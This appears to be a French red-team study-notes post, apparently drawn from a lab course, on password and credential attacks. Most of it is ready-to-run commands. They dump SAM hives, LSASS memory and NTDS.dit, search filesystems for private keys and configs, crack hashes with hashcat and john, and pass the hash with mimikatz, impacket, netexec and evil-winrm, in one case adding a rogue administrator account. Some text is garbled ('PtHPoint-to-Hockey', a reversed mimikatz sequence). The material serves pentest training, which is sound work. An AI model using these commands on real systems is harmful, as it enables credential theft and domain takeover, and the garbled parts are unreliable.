---
title: "Attaque par mot de passe"
date: 2026-03-06T10:00:00+02:00
draft: true
tags: ["pentest", "Active Directory", "PowerView", "reconnaissance", "CRTP", "red team"]
categories: ["Red Team", "pentester"]
summary: ""
showToc: true
tocOpen: true
---
# Introduction au craquage de mots de passe

# Attaque par force brute
Une brute-forceattaque par force brute consiste à tester toutes les combinaisons possibles de lettres, de chiffres et de symboles jusqu'à trouver le bon mot de passe. 
## Attaque par dictionnaire

# Générer des listes de mots à l'aide de CeWL

Nous pouvons utiliser l'outil CeWL pour analyser les mots potentiels du site web d'une entreprise et les enregistrer dans une liste distincte. Cette liste peut ensuite être combinée aux règles souhaitées afin de créer une liste de mots de passe personnalisée, présentant une plus grande probabilité de contenir le mot de passe correct d'un employé. Nous spécifions certains paramètres, tels que la profondeur d'exploration ( -d), la longueur minimale des mots ( -m), le stockage des mots trouvés en minuscules ( --lowercase), ainsi que le fichier de destination des résultats ( -w).

```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## Recherche des fichiers chiffrés 

```
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```


# Recherche des clés SSh


```
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```


ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash



## Attaque de mots de passe a distance 

# Processus d'authentification Windows
## Attaque SAM 

Avec un accès administrateur à un système Windows, nous pouvons tenter d'extraire rapidement les fichiers associés à la base de données SAM, les transférer sur notre machine cible et commencer le décryptage des hachages hors ligne. 
l existe trois ruches de registre que nous pouvons copier si nous disposons d'un accès administrateur local au système cible.

	HKLM/SAM Contient les hachages des mots de passe des comptes utilisateurs locaux.
	KLM/SYSTEM Stocke la clé de démarrage du système, utilisée pour chiffrer la base de données SAM.
HKLM/SECURITY Contient des informations sensibles utilisées par l'autorité de sécurité locale (LSA),  

Nous pouvons sauvegarder ces ruches à l'aide de cet reg.exeutilitaire.

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security c:\security.save

```


Extraction des hachages avec secretsdump

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```

sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txts
```


Divulgation à distance des secrets de la LSA

```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Vidage du SAM à distance

```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Attaque LSASS

https://github.com/skelsec/pypykatz

Grâce à l'accès à une session graphique interactive sur la cible, nous pouvons utiliser le gestionnaire de tâches pour créer un vidage mémoire. Cela nécessite de :

OuvrirTask Manager
Sélectionnez l' Processesonglet
Trouvez et cliquez avec le bouton droit surLocal Security Authority Process
SélectionnerCreate dump file


```
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```


```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

```
scp C:\Users\Michel\Desktop\fichier.txt user@192.168.1.50:/home/user/
```


```
hashcat  -m 1000 31f87811133bc6aaa75a536e77f64314  /usr/share/wordlists/rockyou.txt
```


## Attaque du gestionnaire d'informations d'identification Windows


# Attacking Active Directory and NTDS.dit

Énumération des noms d'utilisateur valides avec Kerbrute

```
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

Pour copier le fichier NTDS.dit, nous avons besoin de droits d'administrateur local

Extraction des hachages à partir de NTDS.dit

```
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

 utiliser NetExec pour capturer NTDS.dit

```
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

Décryptage de hachages et obtention d'identifiants

```
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```


Exemple de Pass the Hash (PtH) avec Evil-WinRM

Nous pouvons toujours utiliser des hachages pour tenter de nous authentifier auprès d'un système grâce à un type d'attaque appelé attaque Pass-the-HashPtH ( PtHPoint-to-Hockey). Une attaque PtH exploite le protocole d'authentification NTLM pour authentifier un utilisateur à l'aide du hachage de son mot de passe.


```
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Recherche d'identifiants sous Windows
## Processus d'authentification Linux


Craquage des identifiants Linux

https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c

```
sudo cp /etc/passwd /tmp/passwd.bak 
[!bash!]$ sudo cp /etc/shadow /tmp/shadow.bak 
[!bash!]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

```


```
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```


## Chasse aux identifiants sous Linux

Recherche des fichiers de configuration

```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Recherche de bases de données

Nous pouvons appliquer cette recherche simple aux autres extensions de fichiers. De plus, nous pouvons l'appliquer aux bases de données stockées dans des fichiers d'extensions différentes, puis les lire.

```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```


## Recherche d'identifiants dans le trafic réseau

https://github.com/SnaffCon/Snaffler

# pass the hash 
https://attack.mitre.org/techniques/T1550/002/

Transmettez le hachage avec Mimikatz (Windows)

Mimikatz possède un module sekurlsa::pthqui permet d'effectuer une telle attaque en lançant un processus à l'aide du hachage du mot de passe de l'utilisateur. Pour utiliser ce module, nous aurons besoin des éléments suivants :

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

Transmettre le hachage avec PowerShell Invoke-TheHash (Windows)

```

 Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

Transmettez le hachage avec Impacket (Linux)

```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Transmettre le hachage avec NetExec (Linux)

```
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

Transmettez le hachage avec evil-winrm (Linux)

```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Transmettez le hachage via RDP

```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


pass the bash


```
sekurlsa::logonpasswords
privilege::debug 

```